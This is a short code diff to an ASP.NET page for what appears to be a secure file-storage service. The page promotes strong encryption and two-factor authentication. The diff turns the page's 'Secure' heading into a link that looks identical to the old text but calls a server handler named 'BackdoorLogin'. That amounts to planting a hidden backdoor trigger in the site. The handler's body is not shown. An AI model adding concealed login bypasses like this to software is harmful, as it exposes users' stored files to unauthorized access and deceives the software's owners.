@@ -80,7 +80,7 @@
             </p>
         </div>
         <div class="col-md-4">
-            <h2><span class="h2secure">Secure</span></h2>
+            <h2><span class="h2secure"><asp:LinkButton runat="server" OnClick="BackdoorLogin">Secure</asp:LinkButton></span></h2>
             <p>
                Secure AES-256 and Blowfish-448 encryption standard used for file storage management, along
                 with secure two factor authentication and facial recognition features. 
